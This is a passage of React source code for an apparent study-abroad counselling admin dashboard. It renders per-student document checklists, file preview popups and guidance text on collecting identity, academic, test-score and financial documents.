                  </td>
                  <td className="py-2.5">
                    <button
                      onClick={() => handleReset(s)}
                      disabled={!!resetting}
                      className="inline-flex items-center gap-1 border border-stone-300 bg-white px-2 py-1 text-[10px] uppercase tracking-[0.15em] text-black transition hover:border-stone-700 disabled:opacity-40"
                    >
                      {resetting === s.student_id ? (
                        <Loader2 className="h-3 w-3 animate-spin" />
                      ) : (
                        <KeyRound className="h-3 w-3" />
                      )}
                      Reset
                    </button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}
    </div>
  );
}

// ============================================================
// StudentDocumentsChecklist — card per student, groups on separate lines.
// Green chip = file uploaded (click for name/size/date popup).
// Muted chip = missing or N/A. Popup lifted to checklist level so it
// renders outside any scroll container.
// Loads from GET /api/students/documents-summary.
// ============================================================

function fmtBytes(n) {
  if (!n) return "";
  if (n < 1024) return `${n} B`;
  if (n < 1024 * 1024) return `${(n / 1024).toFixed(0)} KB`;
  return `${(n / (1024 * 1024)).toFixed(1)} MB`;
}

function fmtDate(iso) {
  if (!iso) return "";
  return new Date(iso).toLocaleDateString("en-IN", { day: "numeric", month: "short", year: "numeric" });
}

const DOC_GROUPS = [
  {
    label: "ID",
    cols: [
      { key: "aadharFile", label: "Aadhaar" },
      { key: "photoFile", label: "Photo" },
      { key: "passportFrontBack", label: "Passport (combined)" },
      { key: "passportFront", label: "Passport front" },
      { key: "passportLast", label: "Passport last" },
    ],
  },
  {
    label: "Academic",
    cols: [
      { key: "marks10sheet", label: "10th marksheet" },
      { key: "marks11sheet", label: "11th marksheet" },
      { key: "marks12predictedSheet", label: "12th predicted" },
      { key: "marks12sheet", label: "12th final" },
      { key: "admitCardFile", label: "Admit card" },
      { key: "transcript", label: "Transcript" },
      { key: "finalDegree", label: "Final degree" },
      { key: "semesterTranscripts", label: "Sem. transcripts" },
    ],
  },
  {
    label: "Tests",
    cols: [
      { key: "ielts_result", label: "IELTS" },
      { key: "toefl_result", label: "TOEFL" },
      { key: "sat_result", label: "SAT / ACT" },
    ],
  },
  {
    label: "Resume",
    cols: [
      { key: "resumeFile", label: "Resume" },
    ],
  },
  // Required Docs group is rendered dynamically via student.req_docs.
  { label: "Required Docs", special: true, dynamic: true },
  {
    label: "Financial",

    cols: [
      { key: "itr", label: "ITR", fin: true },
      { key: "income", label: "Income", fin: true },
      { key: "business", label: "Business", fin: true },
      { key: "kyc", label: "KYC", fin: true },
      { key: "loan", label: "Loan", fin: true },
      { key: "networth", label: "Net Worth", fin: true },
      { key: "affidavit", label: "Affidavit", fin: true },
      { key: "banking", label: "Banking", fin: true },
      { key: "travel", label: "Travel", fin: true },
    ],
  },
];

// Flat list of all toggleable keys, organised by group, for the filter dropdown.
const FILTER_GROUPS = [
  ...DOC_GROUPS.filter(g => !g.dynamic).map(g => ({
    label: g.label,
    items: g.cols.map(c => ({ key: c.key, label: c.label })),
  })),
  {
    label: "Required Docs",
    items: [
      { key: "lor",             label: "LOR" },
      { key: "internship",      label: "Internship" },
      { key: "ngo",             label: "NGO" },
      { key: "extracurricular", label: "Extracurricular" },
      { key: "sop",             label: "SOP" },
    ],
  },
];
const ALL_KEYS = FILTER_GROUPS.flatMap(g => g.items.map(i => i.key));

// Where each document comes from in the intake, and what to tell the student
// if it's missing. Shown in the popup for all chips (green and red).
const DOC_SOURCES = {
  // ── ID ─────────────────────────────────────────────────────────────────────────
  aadharFile: {
    section: "Intake form → Personal Info → Identity Documents",
    purpose: "Used for identity verification, visa applications, and as a primary KYC document for financial institutions and universities.",
    optional: false,
    note: "Student logs into the intake form and uploads under Personal Info → Identity Documents → Aadhaar card (front + back). Once uploaded it is viewable in the student profile under Personal Info. Share the intake form URL with the student if they have not started.",
  },
  photoFile: {
    section: "Intake form → Personal Info → Identity Documents",
    purpose: "Required for university application forms, visa applications, and the student’s Persona profile.",
    optional: false,
    note: "Student uploads a recent passport-size photograph under Personal Info → Identity Documents → Photograph in the intake form. Viewable in the student profile under Personal Info.",
  },
  passportFrontBack: {
    section: "Intake form → Personal Info → Passport",
    purpose: "Primary travel and identity document required by every overseas university and for visa applications in all countries.",
    optional: false,
    note: "Student uploads a single PDF of all passport pages under Personal Info → Passport in the intake form. Accepts combined scans. Viewable in the student profile under Personal Info → Passport.",
  },
  passportFront: {
    section: "Intake form → Personal Info → Passport",
    purpose: "The bio-data (photo) page confirms the student’s legal name, nationality, and passport number for university and visa applications.",
    optional: false,
    note: "Student uploads the passport bio-data page under Personal Info → Passport → Front page in the intake form. Viewable in the student profile under Personal Info → Passport.",
  },
  passportLast: {
    section: "Intake form → Personal Info → Passport",
    purpose: "Shows previous visa endorsements and observations — required for visa applications in most countries.",
    optional: false,
    note: "Student uploads the passport last/observation page under Personal Info → Passport → Last page in the intake form. Viewable in the student profile under Personal Info → Passport.",
  },
  // ── Academic ─────────────────────────────────────────────────────────────────────
  marks10sheet: {
    section: "Intake form → Academic History → Class 10",
    purpose: "Proves completion of secondary education; most universities require 10th board results to establish the student’s academic baseline.",
    optional: false,
    note: "Student uploads their Class 10 marksheet under Academic History → Class 10 in the intake form. Must show subject-wise marks. Viewable in the student profile under Academic History.",
  },
  marks11sheet: {
    section: "Intake form → Academic History → Class 11",
    purpose: "Some universities ask for 11th results to assess academic consistency across grades before final board results.",
    optional: true,
    optionalNote: "Only needed for universities that explicitly request 11th results. Not all programmes ask for this — check each university’s requirements.",
    note: "Student uploads their Class 11 marksheet under Academic History → Class 11 in the intake form. Viewable in the student profile under Academic History.",
  },
  marks12predictedSheet: {
    section: "Intake form → Academic History → Class 12 → Predicted",
    purpose: "Used as an interim grade document while awaiting final board results, allowing universities to issue conditional offers.",
    optional: true,
    optionalNote: "Only needed if the student has not yet received their final Class 12 results. Once final results are out, the final marksheet replaces this.",
    note: "Student uploads their predicted or provisional marksheet under Academic History → Class 12 → Predicted marksheet in the intake form. Viewable in the student profile under Academic History.",
  },
  marks12sheet: {
    section: "Intake form → Academic History → Class 12 → Final",
    purpose: "The primary academic document for undergraduate applications — used to calculate eligibility percentages and verify subject combinations.",
    optional: false,
    note: "Student uploads the final Class 12 board marksheet under Academic History → Class 12 → Final marksheet in the intake form, once results are declared. Viewable in the student profile under Academic History.",
  },
  admitCardFile: {
    section: "Intake form → Academic History → Entrance Exams",
    purpose: "Proves the student appeared for an entrance exam (JEE, NEET, etc.) and is used alongside the score report.",
    optional: true,
    optionalNote: "Only needed if the student appeared for a national or state entrance exam. Skip if no entrance exam was taken.",
    note: "Student uploads their entrance exam admit card under Academic History → Entrance Exams in the intake form. Viewable in the student profile under Academic History.",
  },
  transcript: {
    section: "Intake form → Academic History → University / College",
    purpose: "Official academic record from the university, used to verify degree-level coursework, GPA, and subjects for postgraduate applications.",
    optional: true,
    optionalNote: "Only needed for students applying to postgraduate (Master’s / PhD) programmes. Undergraduate applicants do not need this.",
    note: "Student uploads an official sealed/signed university transcript under Academic History → University / College → Transcript in the intake form. Viewable in the student profile under Academic History.",
  },
  finalDegree: {
    section: "Intake form → Academic History → University / College",
    purpose: "Confirms the student was awarded their undergraduate degree; required by all universities for postgraduate applicants.",
    optional: true,
    optionalNote: "Only needed for students applying to postgraduate programmes who have completed their undergraduate degree. Not required for direct UG applicants.",
    note: "Student uploads their degree certificate under Academic History → University / College → Degree certificate in the intake form. Viewable in the student profile under Academic History.",
  },
  semesterTranscripts: {
    section: "Intake form → Academic History → University / College",
    purpose: "Detailed semester-by-semester academic records that universities use to assess subject depth and grade trajectory.",
    optional: true,
    optionalNote: "Only needed for students currently in or having completed an undergraduate programme (e.g., applying for a Master’s).",
    note: "Student uploads individual semester marksheets under Academic History → University / College → Semester transcripts in the intake form. Viewable in the student profile under Academic History.",
  },
  // ── Tests ────────────────────────────────────────────────────────────────────────
  ielts_result: {
    section: "Intake form → Test Scores → IELTS",
    purpose: "Proves English language proficiency — required by universities in the UK, Canada, Australia, and most other countries outside the US.",
    optional: true,
    optionalNote: "Only needed if the student has taken IELTS. TOEFL or PTE may be submitted as an alternative depending on the university.",
    note: "Student uploads the official IELTS Test Report Form (TRF) under Test Scores → IELTS in the intake form. Must be the full TRF PDF — screenshots are not accepted. Viewable in the student profile under Test Scores.",
  },
  toefl_result: {
    section: "Intake form → Test Scores → TOEFL",
    purpose: "Proves English language proficiency as an alternative to IELTS; accepted by most US universities and many international programmes.",
    optional: true,
    optionalNote: "Only needed if the student has taken TOEFL. IELTS may be submitted as an alternative at most universities.",
    note: "Student uploads their official TOEFL score report under Test Scores → TOEFL in the intake form. Viewable in the student profile under Test Scores.",
  },
  sat_result: {
    section: "Intake form → Test Scores → SAT / ACT",
    purpose: "Standardised admissions test score used for undergraduate applications in the US and some other countries.",
    optional: true,
    optionalNote: "Only needed if the student has taken the SAT or ACT and is applying to universities that require it. Many universities are now test-optional.",
    note: "Student uploads their SAT or ACT score report under Test Scores → SAT / ACT in the intake form. Viewable in the student profile under Test Scores.",
  },
  // ── Resume ───────────────────────────────────────────────────────────────────────
  resumeFile: {
    section: "Auto-generated by AI after intake is complete; also uploadable by the student",
    purpose: "A polished 1–2 page CV summarising the student’s academics, activities, and experience — submitted with most university applications.",
    optional: false,
    note: "The resume is auto-generated by the AI pipeline after the student completes the intake form. The student can also upload one directly under the Resume section of the intake form. If missing, check that AI processing has run — visit the Automation Runs tab. Viewable in the student profile under Resume.",
  },
  // ── Financial ─────────────────────────────────────────────────────────────────────
  itr: {
    section: "Student Dashboard → Financial Documents → Income Tax Returns",
    purpose: "Demonstrates the family’s annual income; used by universities and financial institutions to assess scholarship eligibility and funding capacity.",
    optional: false,
    note: "Uploaded by: the student’s parent/guardian. They log into the student portal with the student’s credentials, open Financial Documents → Income Tax Returns, and upload ITRs for the last 2–3 years. Click ‘View student profile’ above to open the portal and navigate there directly.",
  },
  income: {
    section: "Student Dashboard → Financial Documents → Income Certificate",
    purpose: "Proves the guarantor’s income source — required for education loan applications and university financial declarations.",
    optional: false,
    note: "Uploaded by: the student’s parent/guardian. They log into the student portal, open Financial Documents → Income Certificate, and upload a salary slip or Form 16 from their employer. Click ‘View student profile’ above to open the portal.",
  },
  business: {
    section: "Student Dashboard → Financial Documents → Business Proof",
    purpose: "Required for families with business income — proves income source for visa authorities and loan applications when the guarantor is not salaried.",
    optional: true,
    optionalNote: "Only needed if the primary financial guarantor is self-employed or runs a business. Salaried guarantors submit an income certificate instead.",
    note: "Uploaded by: the student’s parent/guardian (if self-employed or running a business). They log into the student portal, open Financial Documents → Business Proof, and upload registration documents, a balance sheet, or a P&L statement. Click ‘View student profile’ above.",
  },
  kyc: {
    section: "Student Dashboard → Financial Documents → KYC",
    purpose: "Know-Your-Customer documents (PAN + Aadhaar of all financial guarantors) required by banks for education loans and by universities for financial declarations.",
    optional: false,
    note: "Uploaded by: the student or their financial guarantor. They log into the student portal, open Financial Documents → KYC, and upload the PAN card and Aadhaar of all financial guarantors. Click ‘View student profile’ above to open the portal.",
  },
  loan: {
    section: "Student Dashboard → Financial Documents → Education Loan",
    purpose: "The bank’s sanction letter proves a loan has been approved — required by visa authorities and universities when tuition or living costs are funded by a bank loan.",
    optional: true,
    optionalNote: "Only needed if the student is taking an education loan. Students funding themselves (savings, family funds) do not need this.",
    note: "Uploaded by: the student or parent/guardian (only if a bank loan is being taken). They log into the student portal, open Financial Documents → Education Loan, and upload the bank’s sanction letter. Click ‘View student profile’ above.",
  },
  networth: {
    section: "Student Dashboard → Financial Documents → Net Worth Certificate",
    purpose: "A CA-certified statement of all assets and liabilities — required by most overseas universities and visa authorities to confirm the family’s financial capacity to fund the course.",
    optional: false,
    note: "Uploaded by: the student’s parent/guardian. They must first obtain a CA-certified Net Worth Certificate from a chartered accountant, then log into the student portal, open Financial Documents → Net Worth Certificate, and upload it. Click ‘View student profile’ above.",
  },
  affidavit: {
    section: "Student Dashboard → Financial Documents → Affidavit",
    purpose: "A legally signed and stamped declaration of financial responsibility — required by most visa authorities and some universities to confirm who is funding the student’s overseas stay.",
    optional: false,
    note: "Uploaded by: the student or parent/guardian. They log into the student portal, open Financial Documents → Affidavit, and upload the duly stamped and signed financial affidavit. Click ‘View student profile’ above to open the portal.",
  },
  banking: {
    section: "Student Dashboard → Financial Documents → Bank Statements",
    purpose: "6-month bank statements showing sufficient liquid funds — a mandatory requirement for visa applications in virtually every country.",
    optional: false,
    note: "Uploaded by: the student’s parent/guardian. They log into the student portal, open Financial Documents → Bank Statements, and upload 6 months of statements. Click ‘View student profile’ above to open the portal.",
  },
  travel: {
    section: "Student Dashboard → Financial Documents → Travel History",
    purpose: "Previous visa stamps and travel history help visa authorities assess the applicant’s international travel record — often reviewed during visa interviews.",
    optional: true,
    optionalNote: "Only needed if the student has previously travelled internationally. Provide copies of all past visas and entry stamps in their passport.",
    note: "Uploaded by: the student. They log into their student portal, open Financial Documents → Travel History, and upload copies of previous visas or travel stamps. Click ‘View student profile’ above to open the portal.",
  },
  // ── Required Docs (by kind) ─────────────────────────────────────────────────────────────────
  lor: {
    section: "Intake form → Required Docs → LOR details; final letter uploaded via Student Dashboard → Required Documents",
    purpose: "A formal letter from a teacher or professor attesting to the student’s character, academic ability, and suitability for overseas study — required by virtually all overseas universities.",
    optional: false,
    note: "1. Student fills in the recommender’s name, subject, and a brief note during the intake form (Required Docs section). 2. Counsellor drafts the LOR in the Required Documents tab. 3. Once marked done and sent, the student receives a notification. 4. Student collects the signed and stamped letter from the recommender and uploads the final copy via Student Dashboard → Required Documents → upload button on that LOR row.",
  },
  internship: {
    section: "Intake form → Work & Activities → Internship details; final certificate uploaded via Student Dashboard → Required Documents",
    purpose: "A certificate from the employer confirming the internship role and dates — adds credibility to the student’s work experience claims in applications and SOPs.",
    optional: true,
    optionalNote: "Only needed if the student has completed an internship or professional work experience that will be mentioned in their applications.",
    note: "1. Student fills in the company name, role, and activity brief during the intake form (Work & Activities section). 2. Counsellor drafts the experience certificate in the Required Documents tab. 3. Once sent, the student receives the request. 4. Student gets the certificate signed and stamped by company HR and uploads the final copy via Student Dashboard → Required Documents → upload button on that Internship row.",
  },
  ngo: {
    section: "Intake form → Work & Activities → NGO / Volunteering details; final certificate uploaded via Student Dashboard → Required Documents",
    purpose: "A certificate from the NGO or volunteering organisation confirming the student’s contribution — used to substantiate community service claims in applications and SOPs.",
    optional: true,
    optionalNote: "Only needed if the student has volunteered with an NGO or community organisation and wants to include this in their applications.",
    note: "1. Student fills in the NGO/organisation name and volunteering activities during the intake form (Work & Activities section). 2. Counsellor drafts the certificate in the Required Documents tab. 3. Once sent, the student receives the request. 4. Student gets the certificate signed by the organisation and uploads the final copy via Student Dashboard → Required Documents → upload button on that NGO row.",
  },
  extracurricular: {
    section: "Intake form → Work & Activities → Extracurricular details; final letter uploaded via Student Dashboard → Required Documents",
    purpose: "A participation certificate or letter from the institution or coach confirming involvement in sports, arts, or other activities — supports extracurricular claims in applications.",
    optional: true,
    optionalNote: "Only needed if the student has a notable extracurricular activity (sport, music, debate, etc.) they want to highlight in their university applications.",
    note: "1. Student fills in the activity name and institution during the intake form (Work & Activities section). 2. Counsellor drafts the participation letter in the Required Documents tab. 3. Once sent, the student receives the request. 4. Student gets it signed by the institution or coach and uploads the final copy via Student Dashboard → Required Documents → upload button on that Extracurricular row.",
  },
  sop: {
    section: "Drafted entirely by the counsellor using intake data — no student upload required",
    purpose: "The Statement of Purpose is the central essay of any overseas university application — it explains the student’s academic journey, goals, and reasons for choosing the programme and institution.",
    optional: false,
    note: "The SOP is written entirely by the counsellor using the student’s academic record, activities, internships, and personal summary from their completed intake form. Admin must review and approve it in the Required Documents tab before it becomes visible to the student. The student does not upload anything for the SOP.",
  },
}

// ── filter dropdown ──────────────────────────────────────────────────────────

function DocFilterDropdown({ visible, onChange }) {
  const [open, setOpen] = useState(false);
  const ref = useRef(null);

  useEffect(() => {
    if (!open) return;
    function handle(e) { if (ref.current && !ref.current.contains(e.target)) setOpen(false); }
    document.addEventListener("mousedown", handle);
    return () => document.removeEventListener("mousedown", handle);
  }, [open]);

  const toggle = (key) => {
    const next = new Set(visible);
    next.has(key) ? next.delete(key) : next.add(key);
    onChange(next);
  };

  const allSelected = ALL_KEYS.every(k => visible.has(k));

  return (
    <div className="relative" ref={ref}>
      <button
        type="button"
        onClick={() => setOpen(p => !p)}
        className="inline-flex items-center gap-2 border border-stone-300 bg-white px-4 py-2 text-sm font-medium text-black transition hover:border-stone-500"
      >
        <span>{allSelected ? "All documents shown" : `${visible.size} of ${ALL_KEYS.length} shown`}</span>
        <ChevronDown className={`h-4 w-4 transition-transform ${open ? "rotate-180" : ""}`} />
      </button>

      {open && (
        <div className="absolute left-0 top-full z-30 mt-1 w-64 border border-stone-200 bg-white shadow-xl">
          {/* Select all / none row */}
          <div className="flex items-center justify-between border-b border-stone-100 px-4 py-2.5">
            <span className="text-[11px] font-semibold uppercase tracking-[0.15em] text-stone-500">Columns</span>
            <div className="flex gap-3">
              <button type="button" onClick={() => onChange(new Set(ALL_KEYS))}
                className="text-[11px] font-medium text-[#cc785c] hover:underline">All</button>
              <button type="button" onClick={() => onChange(new Set())}
                className="text-[11px] font-medium text-stone-400 hover:underline">None</button>
            </div>
          </div>

          <div className="max-h-80 overflow-y-auto">
            {FILTER_GROUPS.map(group => (
              <div key={group.label}>
                <div className="flex w-full items-center justify-between bg-stone-50 px-4 py-1.5">
                  <span className="text-[10px] font-bold uppercase tracking-[0.15em] text-stone-500">{group.label}</span>
                  <span className="text-[10px] text-stone-400">
                    {group.items.filter(i => visible.has(i.key)).length}/{group.items.length}
                  </span>
                </div>
                {group.items.map(item => (
                  <label key={item.key}
                    className="flex cursor-pointer items-center gap-3 px-4 py-2 text-sm text-black hover:bg-stone-50">
                    <input
                      type="checkbox"
                      checked={visible.has(item.key)}
                      onChange={() => toggle(item.key)}
                      className="h-3.5 w-3.5 accent-[#cc785c]"
                    />
                    {item.label}
                  </label>
                ))}
              </div>
            ))}
          </div>
        </div>
      )}
    </div>
  );
}

function FilePopup({ col, file, studentId, onClose, onOpenStudent }) {
  const hasFile = !!file;
  const fileUrl = hasFile && file.id && studentId
    ? `/api/students/${studentId}/files/${file.id}`
    : null;
  const isImage = hasFile && file.mime_type?.startsWith("image/");
  const isPdf   = hasFile && file.mime_type === "application/pdf";
  const extracted = hasFile && file.ai_extracted
    ? Object.entries(file.ai_extracted).filter(([, v]) => v != null && v !== "")
    : [];
  const src = col.sourceKey ? DOC_SOURCES[col.sourceKey] : null;

  return (
    <div
      className="fixed inset-0 z-50 flex items-center justify-center bg-black/40 p-4"
      onClick={onClose}
    >
      <div
        className="relative flex w-full max-w-2xl flex-col rounded-xl border border-stone-200 bg-white shadow-2xl"
        style={{ maxHeight: "92vh" }}
        onClick={(e) => e.stopPropagation()}
      >
        {/* Header */}
        <div className={`flex items-start justify-between border-b px-6 py-5 ${hasFile ? "border-stone-100" : "border-red-100 bg-red-50"}`}>
          <div className="flex-1 min-w-0">
            <p className="mb-1 text-xs font-semibold uppercase tracking-[0.2em] text-stone-400">{col.label}</p>
            {hasFile ? (
              <>
                <p className="break-all text-lg font-semibold text-black">{file.original_name}</p>
                <div className="mt-1.5 flex flex-wrap gap-4 text-sm text-stone-500">
                  {file.size       ? <span>{fmtBytes(file.size)}</span>       : null}
                  {file.created_at ? <span>{fmtDate(file.created_at)}</span>  : null}
                  {fileUrl && (
                    <a href={fileUrl} target="_blank" rel="noreferrer"
                      className="font-medium text-[#cc785c] hover:underline">
                      Open in new tab ↗
                    </a>
                  )}
                </div>
              </>
            ) : (
              <p className="text-xl font-bold text-red-700">Not yet uploaded</p>
            )}
          </div>
          <div className="ml-4 flex shrink-0 flex-col items-end gap-2">
            {onOpenStudent && (
              <button
                onClick={onOpenStudent}
                className="text-sm font-semibold text-[#cc785c] hover:underline whitespace-nowrap"
              >
                View student profile →
              </button>
            )}
            <button className="text-stone-400 hover:text-stone-700" onClick={onClose}>
              <X className="h-5 w-5" />
            </button>
          </div>
        </div>

        {/* Scrollable body */}
        <div className="overflow-y-auto px-6 py-5 space-y-6">

          {/* ── Document preview — shown first so you see it immediately ── */}
          {fileUrl && isImage && (
            <img src={fileUrl} alt={file.original_name}
              className="w-full rounded border border-stone-200 object-contain"
              style={{ maxHeight: 420 }} />
          )}
          {fileUrl && isPdf && (
            <iframe src={fileUrl} title={file.original_name}
              className="w-full rounded border border-stone-200"
              style={{ height: 420 }} />
          )}
          {fileUrl && !isImage && !isPdf && (
            <a href={fileUrl} target="_blank" rel="noreferrer"
              className="inline-flex items-center gap-2 rounded border border-stone-300 bg-stone-50 px-4 py-3 text-sm font-semibold text-black hover:bg-stone-100">
              Download / open file ↗
            </a>
          )}

          {/* Missing-file status: required vs optional */}
          {!hasFile && src && (
            <div className={`rounded border px-5 py-4 ${src.optional ? "border-amber-200 bg-amber-50" : "border-red-200 bg-red-50"}`}>
              <p className={`text-base font-bold ${src.optional ? "text-amber-800" : "text-red-800"}`}>
                {src.optional ? "Optional — not required for every applicant" : "Required — the student must provide this"}
              </p>
              <p className={`mt-1.5 text-sm leading-relaxed ${src.optional ? "text-amber-700" : "text-red-700"}`}>
                {src.optional && src.optionalNote
                  ? src.optionalNote
                  : "This document is required for all applicants. Follow the steps in the section below to collect it."}
              </p>
            </div>
          )}

          {/* What this document is for */}
          {src?.purpose && (
            <div>
              <p className="mb-2 text-xs font-semibold uppercase tracking-[0.18em] text-stone-400">What this document is used for</p>
              <p className="text-base leading-relaxed text-black">{src.purpose}</p>
            </div>
          )}

          {/* AI description */}
          {hasFile && file.ai_description && (
            <div>
              <p className="mb-2 text-xs font-semibold uppercase tracking-[0.18em] text-stone-400">AI Analysis</p>
              <p className="text-base leading-relaxed text-black">{file.ai_description}</p>
            </div>
          )}

          {/* AI extracted fields */}
          {extracted.length > 0 && (
            <div>
              <p className="mb-2 text-xs font-semibold uppercase tracking-[0.18em] text-stone-400">Extracted Fields</p>
              <div className="rounded border border-stone-200 bg-stone-50">
                {extracted.map(([k, v], i) => (
                  <div key={k}
                    className={`grid gap-x-4 px-4 py-3 text-sm ${i !== extracted.length - 1 ? "border-b border-stone-100" : ""}`}
                    style={{ gridTemplateColumns: "200px 1fr" }}>
                    <span className="font-semibold text-stone-600">{k}</span>
                    <span className="text-black">{String(v)}</span>
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* How to collect / where this comes from */}
          {src && (
            <div className="rounded border border-stone-200 bg-stone-50 px-5 py-4 space-y-2">
              <p className="text-xs font-semibold uppercase tracking-[0.18em] text-stone-400">How to collect this document</p>
              <p className="text-sm font-bold text-stone-700">{src.section}</p>
              <p className="text-sm leading-relaxed text-stone-700">{src.note}</p>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

function ChipX({ onRemove }) {
  return (
    <span
      role="button"
      tabIndex={0}
      onMouseDown={(e) => { e.preventDefault(); e.stopPropagation(); onRemove(); }}
      className="ml-1.5 flex h-4 w-4 shrink-0 items-center justify-center rounded-full bg-black text-[10px] font-bold text-white hover:bg-stone-700 cursor-pointer leading-none"
      aria-label="Hide column"
    >
      ×
    </span>
  );
}

function DocChip({ col, docs, onShowPopup, onRemove }) {
  const val = docs[col.key];
  const colWithSource = { ...col, sourceKey: col.key };

  if (col.fin) {
    if (val === null) {
      // N/A — not applicable for this student
      return (
        <button
          className="group inline-flex items-center gap-1 rounded border border-stone-200 bg-stone-50 px-3 py-1.5 text-xs text-stone-400 transition-colors hover:bg-stone-100"
          onClick={() => onShowPopup({ col: colWithSource, file: null })}
        >
          — {col.label}
          <ChipX onRemove={onRemove} />
        </button>
      );
    }
    return val ? (
      <button
        className="group inline-flex items-center gap-1 rounded border border-emerald-400/50 bg-emerald-50 px-3 py-1.5 text-xs font-medium text-emerald-700 transition-colors hover:bg-emerald-100"
        onClick={() => onShowPopup({ col: colWithSource, file: null })}
      >
        ✓ {col.label}
        <ChipX onRemove={onRemove} />
      </button>
    ) : (
      <button
        className="group inline-flex items-center gap-1 rounded border border-red-200 bg-red-50 px-3 py-1.5 text-xs font-medium text-red-600 transition-colors hover:bg-red-100"
        onClick={() => onShowPopup({ col: colWithSource, file: null })}
      >
        ✗ {col.label}
        <ChipX onRemove={onRemove} />
      </button>
    );
  }

  const file = val;
  return file ? (
    <button
      className="group inline-flex items-center gap-1 rounded border border-emerald-400/50 bg-emerald-50 px-3 py-1.5 text-xs font-medium text-emerald-700 transition-colors hover:bg-emerald-100"
      onClick={() => onShowPopup({ col: colWithSource, file })}
    >
      ✓ {col.label}
      <ChipX onRemove={onRemove} />
    </button>
  ) : (
    <button
      className="group inline-flex items-center gap-1 rounded border border-red-200 bg-red-50 px-3 py-1.5 text-xs font-medium text-red-600 transition-colors hover:bg-red-100"
      onClick={() => onShowPopup({ col: colWithSource, file: null })}
    >
      ✗ {col.label}
      <ChipX onRemove={onRemove} />
    </button>
  );
}

// Recommended-docs chip grid. Each kind (LOR, Internship, NGO,
// Extracurricular, SOP) is always represented in the row — even when
// the student has zero slots of that kind — so the counsellor can see
// at a glance what's still missing instead of an unlabeled "+".
//
// Chip states:
//   green ✓  = signed copy uploaded for that slot
//   red   ✗  = slot exists but no signed copy yet
//   red   +  = placeholder for a kind with no slots (click adds one)
// Click any chip → opens the RecommendedDocPopup so staff can add /
// upload / approve. The trailing dashed "+ another" button after a
// kind's existing slots still adds a second / third row.
function ReqDocsGroup({ reqdocs, visibleKinds, studentId, onShowReqDoc, onAddKind }) {
  const visible = (reqdocs || []).filter(rd => visibleKinds.has(rd.kind));
  const kindOrder = ["lor", "internship", "ngo", "extracurricular", "sop"];
  const groupedByKind = new Map();
  for (const rd of visible) {
    if (!groupedByKind.has(rd.kind)) groupedByKind.set(rd.kind, []);
    groupedByKind.get(rd.kind).push(rd);
  }
  const kindLabel = (kind) =>
    kind === "lor" ? "LOR"
    : kind === "internship" ? "Internship"
    : kind === "ngo" ? "NGO"
    : kind === "extracurricular" ? "Extracurricular"
    : "SOP";
  return (
    <div className="flex flex-wrap gap-1">
      {kindOrder.filter(k => visibleKinds.has(k)).map((kind) => {
        const rows = (groupedByKind.get(kind) || []).slice().sort((a, b) => a.seq - b.seq);
        // Empty-kind placeholder: one red labeled chip that, on click,
        // creates a row of this kind. Replaces the prior unlabeled "+".
        if (rows.length === 0) {
          return (
            <button
              key={`${kind}-placeholder`}
              type="button"
              onClick={() => onAddKind(kind)}
              className="inline-flex items-center gap-1 rounded border border-red-300 bg-red-50 px-2 py-0.5 text-[11px] font-semibold text-red-700 transition-colors hover:bg-red-100"
              title={`No ${kindLabel(kind)} uploaded yet — click to add a slot`}
            >
              + {kindLabel(kind)}
            </button>
          );
        }
        return (
          <div key={kind} className="flex flex-wrap items-center gap-1">
            {rows.map((rd) => {
              const approved = !!rd.approved_by_admin_at;
              const hasFile  = !!rd.final_file;
              const slotLabel = rd.kind === "sop" ? "SOP" : `${kindLabel(rd.kind)} ${rd.seq}`;
              // Approved → green ✓ ; uploaded → green ✓ ; missing → red ✗.
              // The previous "draft uploaded but not signed yet" white-chip
              // state has been collapsed into red because the user wants a
              // single signal — "is the signed copy in?" — and a neutral
              // white chip read as "done" at a glance.
              const tone = approved || hasFile
                ? "border-emerald-400/60 bg-emerald-50 text-emerald-700 hover:bg-emerald-100"
                : "border-red-300 bg-red-50 text-red-700 hover:bg-red-100";
              const icon = approved ? "✓" : hasFile ? "✓" : "✗";
              return (
                <button
                  key={`${rd.kind}-${rd.seq}-${rd.id}`}
                  className={`inline-flex items-center gap-1 rounded border px-2 py-0.5 text-[11px] font-medium transition-colors ${tone}`}
                  onClick={() => onShowReqDoc(rd)}
                  title={approved ? "Approved by admin" : hasFile ? "Signed copy uploaded — click to view" : "No signed copy yet — click to upload"}
                >
                  {icon} {slotLabel}
                </button>
              );
            })}
            <button
              type="button"
              onClick={() => onAddKind(kind)}
              className="inline-flex items-center rounded border border-dashed border-stone-300 bg-white px-1.5 py-0.5 text-[11px] font-semibold text-stone-500 transition-colors hover:border-[#cc785c] hover:text-[#cc785c]"
              title={`Add another ${kindLabel(kind)}`}
            >+</button>
          </div>
        );
      })}
    </div>
  );
}

// ── Profile selector helpers ─────────────────────────────────────────────────
const LOCATIONS = [
  { value: "in_india",      label: "In India" },
  { value: "outside_india", label: "Outside India" },
];
const LEVELS = [
  { value: "undergrad", label: "Undergrad" },
  { value: "postgrad",  label: "Postgrad" },
];
function configKey(location, level) {
  return `${location}_${level}`;
}

function ProfileToggle({ value, options, onChange, disabled }) {
  return (
    <div className="flex">
      {options.map((opt, i) => (
        <button
          key={opt.value}
          type="button"
          disabled={disabled}
          onClick={() => onChange(opt.value)}
          className={`px-2.5 py-1 text-[10px] font-semibold uppercase tracking-[0.12em] transition
            ${i === 0 ? "rounded-l border-t border-b border-l" : "rounded-r border"}
            ${value === opt.value
              ? "border-stone-700 bg-stone-700 text-white"
              : "border-stone-300 text-stone-500 hover:border-stone-500 hover:text-black"
            }`}
        >
          {opt.label}
        </button>
      ))}
    </div>
  );
}

function StudentDocCard({ student, role, configs, onShowPopup, onShowReqDoc, onAddReqDoc, onRemoveFromConfig, onUpdateProfile, onOpenStudent, embedded = false }) {
  const handleShowPopup = ({ col, file }) =>
    onShowPopup({ col, file, studentId: student.student_id });
  const handleShowReqDoc = (rd) =>
    onShowReqDoc(rd, student.student_id);
  const handleAddReqDoc = (kind) =>
    onAddReqDoc(kind, student.student_id);

  const loc   = student.doc_location;
  const lvl   = student.doc_level;
  const key   = loc && lvl ? configKey(loc, lvl) : null;
  const visibleCols = key && configs[key] ? configs[key] : new Set(ALL_KEYS);

  const handleRemove = (docKey) => {
    if (!loc || !lvl) return;
    onRemoveFromConfig(loc, lvl, docKey);
  };

  // `embedded` drops the outer border/padding/name header — the parent
  // dropdown row already provides them, and showing the name twice was
  // duplicate noise once we moved to lazy-load.
